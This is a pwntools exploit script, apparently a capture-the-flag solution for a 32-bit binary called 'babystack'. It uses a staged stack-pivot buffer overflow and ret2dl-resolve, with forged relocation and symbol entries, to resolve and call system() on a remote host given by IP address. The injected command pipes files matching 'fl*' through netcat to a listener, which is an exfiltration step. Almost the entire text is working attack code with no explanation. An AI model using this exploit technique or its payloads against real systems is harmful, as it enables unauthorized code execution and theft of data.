from pwn import *
from hashlib import sha256

def proof_of_work(chal):
    target = [0,0,0,0]
    while 1:
        sol = os.urandom(4)
        temp = sha256(chal+sol).digest()
        if temp.startswith('\0\0\0'):
            return sol
    return ''

Str_table = 0x804822C
Relocation_table = 0x804aacc-8  # =>DT_JMPREL->d_un
leak = Relocation_table - 0x80482B0 #fake DT_JMPREL->d_un to 0x804ac00
Symbol_table = 0x804aacc
info = Symbol_table - 0x80481CC #0x2900
offset = 0x804a018
Str_system = 0x804a900
st_name = Str_system - Str_table

#r = process('./babystack')
#r = process(['python', './pow.py'])
r = remote('202.120.7.202', 6666)
raw_input('?')

payload = p32(0)*10
payload += p32(Relocation_table-8) #new ebp
payload += p32(0x804843E) #return address
payload += p32(0)*4

log.info("Done payload [1]")

payload += p32(0)*10
payload += p32(Str_system-8) #new ebp
payload += p32(0x804843E) #return address
payload += p32(offset)
payload += p32(((info>>4)<<8)+7)
payload += p32(st_name)
payload += p32(0)

log.info("Done payload [2]")

code = "cat fl*|nc localhost 90"

payload += p64(0)
payload += code
payload += "\x00"*(0x20-len(code))
payload += p32(0x804a500-8) #new ebp
payload += p32(0x804843E) #return address
payload += "system\x00\x00" #0x804a500
payload += p32(0)
payload += p32(0)

log.info("Done payload [3]")


payload += p32(0)*10
payload += p32(0x804a500-8) #new ebp
payload += p32(0x80482F0) #return address
payload += p32(leak)
payload += p32(0)
payload += p32(0x804a8d8)*2
log.info("Done payload [4]")
log.info("Length: %#x" %len(payload))
chal = r.recv(16)
log.info(chal)
res = proof_of_work(chal)
r.send(res)

r.send(payload)
r.interactive()
